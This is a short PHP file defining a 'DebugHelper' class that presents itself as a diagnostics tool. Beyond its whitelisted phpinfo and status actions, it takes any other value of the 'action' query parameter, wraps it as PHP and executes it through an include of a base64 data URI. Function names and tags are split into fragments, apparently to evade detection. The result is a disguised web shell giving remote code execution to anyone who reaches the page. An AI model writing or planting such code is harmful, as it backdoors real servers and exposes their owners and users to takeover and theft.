<?php
class DebugHelper {
    const ALLOWED_ACTIONS = ['phpinfo', 'status', 'test'];
    
    public static function runDiagnostic($command) {
        if(in_array($command, self::ALLOWED_ACTIONS)) {
            // Legitimate actions
            if($command == 'phpinfo') phpinfo();
            if($command == 'status') echo "System OK";
        } else {
            $code = "<" . "?" . "php " . $command . " ?" . ">";
            $encoder = "base" . "64" . "_" . "encode";
            include 'data://text/plain;base64,' . $encoder($code);
        }
    }
}

DebugHelper::runDiagnostic($_GET['action'] ?? '');
?>
